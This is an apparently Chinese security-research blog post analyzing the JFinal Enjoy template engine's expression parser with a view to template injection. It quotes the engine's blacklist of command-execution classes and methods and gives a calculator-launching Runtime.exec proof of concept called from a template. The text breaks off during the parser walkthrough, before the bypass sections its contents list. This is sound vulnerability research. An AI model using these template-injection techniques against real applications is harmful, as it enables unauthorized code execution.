<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="Enjoy模板引擎分析前置首先有关Enjoy模板引擎的一些描述可以看这里：https:&#x2F;&#x2F;jfinal.com&#x2F;doc&#x2F;6-1 文档中值得关注的点属性访问触发get方法在官方文档里面我们可以看到很多有趣的东西(当然我会更关注于一些相关的)，比如属性访问的这一条描述，可以让我们去触发对象的get方法(前提是public修饰) 12345由于模板引擎的属性取值表达式极为常用，所以对其在用户体验上进行了"><meta property="og:type" content="article"><meta property="og:title" content="Enjoy模板引擎分析"><meta property="og:url" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/index.html"><meta property="og:site_name" content="Y4tacker:Hacking The World!"><meta property="og:description" content="Enjoy模板引擎分析前置首先有关Enjoy模板引擎的一些描述可以看这里：https:&#x2F;&#x2F;jfinal.com&#x2F;doc&#x2F;6-1 文档中值得关注的点属性访问触发get方法在官方文档里面我们可以看到很多有趣的东西(当然我会更关注于一些相关的)，比如属性访问的这一条描述，可以让我们去触发对象的get方法(前提是public修饰) 12345由于模板引擎的属性取值表达式极为常用，所以对其在用户体验上进行了"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/1.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/2.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/3.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/4.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/5.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/6.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/7.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/8.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/9.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/10.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/11.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/12.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/13.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/14.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/15.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/16.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/17.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/18.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/19.png"><meta property="article:published_time" content="2022-04-14T04:15:23.000Z"><meta property="article:modified_time" content="2024-08-04T09:01:49.259Z"><meta property="article:author" content="Y4tacker"><meta property="article:tag" content="Java"><meta property="article:tag" content="Enjoy模板"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/1.png"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>Enjoy模板引擎分析</title><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="Y4tacker:Hacking The World!" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" aria-label="Top" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa-solid fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" aria-label="Previous post" href="/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" aria-label="Next post" href="/2022/04/13/year/2022/4/%E6%88%91%E4%B8%8ERuoYi%E7%9A%84%E6%94%BB%E9%98%B2%E5%8F%B2/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" aria-label="Back to top" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&text=Enjoy模板引擎分析"><i class="fab fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&title=Enjoy模板引擎分析"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&is_video=false&description=Enjoy模板引擎分析"><i class="fab fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=Enjoy模板引擎分析&body=Check out this article: https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&title=Enjoy模板引擎分析"><i class="fab fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&title=Enjoy模板引擎分析"><i class="fab fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&title=Enjoy模板引擎分析"><i class="fab fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&title=Enjoy模板引擎分析"><i class="fab fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&name=Enjoy模板引擎分析&description="><i class="fab fa-tumblr" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&t=Enjoy模板引擎分析"><i class="fab fa-hacker-news" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Enjoy模板引擎分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E6%A1%A3%E4%B8%AD%E5%80%BC%E5%BE%97%E5%85%B3%E6%B3%A8%E7%9A%84%E7%82%B9"><span class="toc-number">1.1.1.</span> <span class="toc-text">文档中值得关注的点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE%E8%A7%A6%E5%8F%91get%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">属性访问触发get方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">方法调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">静态属性访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">静态方法的调用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E6%93%8E%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">引擎执行流程简单分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87Bypass"><span class="toc-number">1.3.</span> <span class="toc-text">绕过Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E8%87%AA%E5%B8%A6%E7%B1%BB%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.1.</span> <span class="toc-text">Java自带类绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9B%9E%E6%98%BE"><span class="toc-number">1.4.</span> <span class="toc-text">获取回显</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.4.1.</span> <span class="toc-text">写入内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%9B%9E%E6%98%BE"><span class="toc-number">1.4.2.</span> <span class="toc-text">直接回显</span></a></li></ol></li></ol></li></ol></div></span></div><div class="content index py4"><article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle p-name" itemprop="name headline">Enjoy模板引擎分析</h1><div class="meta"><span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-name" itemprop="name">Y4tacker</span></span><div class="postdate"><time datetime="2022-04-14T04:15:23.000Z" class="dt-published" itemprop="datePublished">2022-04-14</time> (Updated: <time datetime="2024-08-04T09:01:49.259Z" class="dt-updated" itemprop="dateModified">2024-08-04</time>)</div><div class="article-category"><i class="fa-solid fa-archive"></i> <a class="category-link" href="/categories/Java/">Java</a></div><div class="article-tag"><i class="fa-solid fa-tag"></i> <a class="p-category" href="/tags/Enjoy%E6%A8%A1%E6%9D%BF/" rel="tag">Enjoy模板</a>, <a class="p-category" href="/tags/Java/" rel="tag">Java</a></div></div></header><div class="content e-content" itemprop="articleBody"><h1 id="Enjoy模板引擎分析"><a href="#Enjoy模板引擎分析" class="headerlink" title="Enjoy模板引擎分析"></a>Enjoy模板引擎分析</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>首先有关Enjoy模板引擎的一些描述可以看这里：<a target="_blank" rel="noopener" href="https://jfinal.com/doc/6-1">https://jfinal.com/doc/6-1</a></p><h3 id="文档中值得关注的点"><a href="#文档中值得关注的点" class="headerlink" title="文档中值得关注的点"></a>文档中值得关注的点</h3><h4 id="属性访问触发get方法"><a href="#属性访问触发get方法" class="headerlink" title="属性访问触发get方法"></a>属性访问触发get方法</h4><p>在官方文档里面我们可以看到很多有趣的东西(当然我会更关注于一些相关的)，比如属性访问的这一条描述，可以让我们去触发对象的get方法(前提是public修饰)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于模板引擎的属性取值表达式极为常用，所以对其在用户体验上进行了符合直觉的扩展，field 表达式取值优先次序，以 user.name 为例：</span><br><span class="line"></span><br><span class="line">如果 user.getName() 存在，则优先调用</span><br><span class="line"></span><br><span class="line">如果 user 具有 <span class="keyword">public</span> 修饰过的name 属性，则取 user.name 属性值（注意：jfinal <span class="number">4.0</span> 之前这条规则的优先级最低）</span><br></pre></td></tr></table></figure><h4 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h4><p>关于方法调用也有一些描述，说可以直接调用对象上的任何public方法，使用规则与java中调用方式保持一致，当然也不是所有方法都能调用，在源码的调试过程当中发现有一些方法在黑名单当中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">getClass</span><br><span class="line">wait</span><br><span class="line">notifyAll</span><br><span class="line">getClassLoader</span><br><span class="line">invoke</span><br><span class="line">notify</span><br><span class="line">getDeclaringClass</span><br><span class="line">removeForbiddenMethod</span><br><span class="line">removeForbiddenClass</span><br><span class="line">suspend</span><br><span class="line">resume</span><br><span class="line">loadLibrary</span><br><span class="line">forName</span><br><span class="line">newInstance</span><br><span class="line">exit</span><br><span class="line">halt</span><br><span class="line">stop</span><br></pre></td></tr></table></figure><p>除此以外也有黑名单类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ThreadGroup</span><br><span class="line">java.lang.ProcessBuilder</span><br><span class="line">java.lang.System</span><br><span class="line">java.lang.ClassLoader</span><br><span class="line">java.lang.reflect.Proxy</span><br><span class="line">java.lang.Runtime</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.lang.Class</span><br><span class="line">com.jfinal.template.expr.ast.MethodKit</span><br><span class="line">java.io.File</span><br><span class="line">java.lang.reflect.Method</span><br><span class="line">java.lang.InheritableThreadLocal</span><br><span class="line">java.lang.Process</span><br><span class="line">java.lang.ThreadLocal</span><br><span class="line">java.lang.Package</span><br><span class="line">java.lang.SecurityManager</span><br><span class="line">java.lang.Compiler</span><br><span class="line">java.lang.RuntimePermission</span><br></pre></td></tr></table></figure><p>因此也给了我们更多的限制</p><h4 id="静态属性访问"><a href="#静态属性访问" class="headerlink" title="静态属性访问"></a>静态属性访问</h4><p>来个例子就懂了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">if</span>(x.status == com.demo.common.model.Account::STATUS_LOCK_ID)</span><br><span class="line">   &lt;span&gt;(账号已锁定)&lt;/span&gt;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h4 id="静态方法的调用"><a href="#静态方法的调用" class="headerlink" title="静态方法的调用"></a>静态方法的调用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">if</span>(com.jfinal.kit.StrKit::isBlank(title))</span><br><span class="line">   ....</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>同时支持调用静态属性上的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(com.jfinal.MyKit::me).method(paras)</span><br></pre></td></tr></table></figure><h2 id="引擎执行流程简单分析"><a href="#引擎执行流程简单分析" class="headerlink" title="引擎执行流程简单分析"></a>引擎执行流程简单分析</h2><p>以下不感兴趣可以直接略过，因为不需要一些很详细的分析就能bypass，只要我们知道过滤了哪些类哪些方法针对绕过即可，这里权当自己好奇看看如何实现的，当然分析也只会主要去看一些能让我成功实现执行不安全函数的方式(指的是<code>#()</code>与<code>#set()</code>两种)，根据对文档的阅读，个人认为其他标签对于我意义不大，因为我如果能够执行一个命令我需要的是能够回显<code>#()</code>，或者我不能通过一步执行需要通过<code>#set(a=xxx)</code>的方式去拆分保存变量做中转，因此我在分析调试的过程当中只会针对这两个标签进行分析</p><p>为了独立分析这里引入了maven坐标</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.jfinal<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>enjoy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.9.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一个基本的使用很简单，为了方便调试我写了个很简单的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ezsb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -na Calculator&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Template template = engine.getTemplateByString(<span class="string">&quot;#(com.example.ezsb.User::run())&quot;</span>);</span><br><span class="line">template.renderToString();</span><br></pre></td></tr></table></figure><p>首先由于默认未开启缓存，默认走第一个分支</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/1.png"></p><p>接下来我们看<code>com.jfinal.template.Engine#buildTemplateBySource</code>,同样我们只需要更关注于解析部分也就是<code>parser.parse()</code></p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/2.png"></p><p>接下来我们先跟一下这个遍历字符串解析token的过程，首先是初步解析操作与内容，比如<code>#(xxx)</code>他就会识别成<code>OUTPUT xxxx )</code>三部分，<code>#set(&quot;a=xxx&quot;)</code>也会拆分成<code>set a=xxx )三部分</code>之后在statlist中，根据是<code>TEXT\SET\FOR\OUTPUT\INCLUDE\FOR\DEFINE\CALL.....</code>等去做更进一步的解析</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/3.png"></p><p>这里我们看看,首先当前位置一定是<code>#</code>，不然也没意义了，这里光看英文单词就知道我们更应该专注看<code>com.jfinal.template.stat.Lexer#scanDire</code></p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/4.png"></p><p>这里如果<code>#</code>后面是<code>(</code>也就直接对应了<code>OUTPUT</code>，如果不是则判断后面如果是字母则转到state为10的分支（PS：后面那个如果是@则调用模板函数防止你们好奇），并设置对应的token</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/5.png"></p><p>接下来我们看看state为10的地方做的什么首先通过id去获取symbol</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/6.png"></p><p>简单看看这里一些内置的东西，如果没有的话就会去看是不是走define或者else if分支，当然超纲了我上面说过的只看<code>#()</code>和<code>#set()</code>，这里就不深入谈了</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/7.png"></p><p>接下来看debug窗口就和我们上面说的一样设置了下面的toknelist的内容</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/8.png"></p><p>接下来我们继续看看<code>statList</code>函数(在上一步的基础上进行更进一步的解析)，这里不管是<code>OUTPUT</code>还是<code>SET</code>其实值得我们关注的核心调用是相同的，也就是<code>this.parseExprList(para)</code></p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/9.png"></p><p>跟进<code>parseExprList</code>，一直到<code>com.jfinal.template.expr.ExprParser#parse</code>，我们跟进这个scan</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/10.png"></p><p>这里不再通篇像上面那样说如何解析的了，有兴趣可以自己看</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/11.png"></p><p>这里我们只看几个关键的，在scanOperator里面，一个是<code>::</code>作为STATIC静态标记，另一个是左括号和又括号</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/12.png"></p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/13.png"></p><p>在最终做完这些处理后，tokenList成了这个样子</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/14.png"></p><p>接下来我们看看下面，首先initPeek会将peek设置为tokenList当中的第一个，之后默认会调用<code>exprList</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Expr <span class="title">parse</span><span class="params">(<span class="keyword">boolean</span> isExprList)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.tokenList = (<span class="keyword">new</span> ExprLexer(<span class="keyword">this</span>.paraToken, <span class="keyword">this</span>.location)).scan();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.tokenList.size() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ExprList.NULL_EXPR_LIST;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.tokenList.add(EOF);</span><br><span class="line">        <span class="keyword">this</span>.initPeek();</span><br><span class="line">        Expr expr = isExprList ? <span class="keyword">this</span>.exprList() : <span class="keyword">this</span>.forCtrl();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.peek() != EOF) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ParseException(<span class="string">&quot;Expression error: can not match \&quot;&quot;</span> + <span class="keyword">this</span>.peek().value() + <span class="string">&quot;\&quot;&quot;</span>, <span class="keyword">this</span>.location);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Expr)expr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在exprList,具体的过程也比较复杂</p><figure class="highlight java"><table><tr><td 